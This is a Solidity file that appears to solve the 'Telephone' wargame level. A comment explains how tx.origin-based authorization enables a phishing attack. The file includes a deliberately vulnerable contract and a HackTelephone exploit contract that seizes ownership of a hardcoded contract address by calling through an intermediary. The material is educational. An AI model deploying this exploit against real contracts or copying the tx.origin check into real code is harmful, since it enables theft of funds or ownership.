/*
    msg.sender can be a contract,
    tx.origin can never be a contract

    Consider chain: A -> B -> C, 'msg.sender' inside C will be B but 'tx.origin' will be A

    Hacker can exploit this to make phising attack.
    Example:
    - a contract token's trasfer function
    function transfer(address _to, uint _value) {
        tokens[tx.origin] -= _value;
        tokens[_to] += _value;
    }

    - hacker convince user to send ether to malicious contract which call a function like this

    function () payable {
        token.transfer(attackerAddress, 10000);
    }

    => user -> contract-hacker -> token
    => tx.origin = user; msg.sender = contract-hacker 
    => user lose ether to that contract

    => avoid using 'tx.origin'  
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract Telephone {
    address public owner;
    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract HackTelephone {
    Telephone public contractInstance = Telephone(address(0x264c833A444A03F13f7Ff85D279745973630f25b));

    function hack() public {
        contractInstance.changeOwner(msg.sender);
    }
}